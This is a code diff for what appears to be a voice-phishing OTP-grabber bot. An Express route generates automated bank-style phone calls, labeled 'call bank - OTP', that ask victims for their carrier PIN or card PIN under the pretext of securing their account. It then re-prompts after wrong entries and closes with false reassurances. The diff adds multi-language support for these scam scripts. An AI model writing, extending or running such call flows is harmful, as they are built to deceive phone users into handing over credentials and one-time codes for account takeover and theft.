@@ -1,6 +1,8 @@
 import { bot } from '../..';
 import { app } from '../';
 import { v4 as uuidv4 } from 'uuid';
+import { getLangPins } from '../../languages';
+import { Language } from '../../types';
 
 app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
   const { step, chatId, language } = req.params;
@@ -18,10 +20,11 @@ app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              pinType === 'carrierPin'
-                ? `You have not entered anything. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `You have not entered anything. For your security and to protect your account. Enter your ${pinType} followed by the pound key`,
+            payload: getLangPins({
+              step: `1`,
+              pinType: `${pinType}`,
+              language: language as Language,
+            }),
             language,
             voice: 'female',
           },
@@ -63,7 +66,11 @@ app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `The ${pinType} you have entered is incorrect. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`,
+              payload: getLangPins({
+                step: `2`,
+                pinType: `${pinType}`,
+                language: language as Language,
+              }),
               language,
               voice: 'female',
             },
@@ -104,7 +111,11 @@ app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `The ${pinType} you have entered is incorrect. For your security and to protect your account. Enter your ${pinType} again followed by the pound key.`,
+              payload: getLangPins({
+                step: `2`,
+                pinType: `${pinType}`,
+                language: language as Language,
+              }),
               language,
               voice: 'female',
             },
@@ -148,7 +159,7 @@ app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
 
   return res.json({
     id: uuidv4(),
-    title: `call bank - ${chatId} no OTP`,
+    title: `call bank - ${chatId} OTP`,
     record: false,
     steps: [
       {
@@ -157,10 +168,12 @@ app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
         options: {
           payload:
             pinType === 'carrierPin'
-              ? `Great. Your Account is now active. we will continue to monitor and protect your account from any unauthorize charge in the future.
-          Thank you for being a valued customer. You can now hang up`
-              : `Great. Your CARD is now active. we will continue to monitor and protect your account from any unauthorize charge in the future.
-          Thank you for being a valued customer. You can now hang up`,
+              ? `Thank you for verifying. The request has been blocked, Good bye.`
+              : getLangPins({
+                  step: `3`,
+                  pinType: `${pinType}`,
+                  language: language as Language,
+                }),
           language,
           voice: 'female',
         },
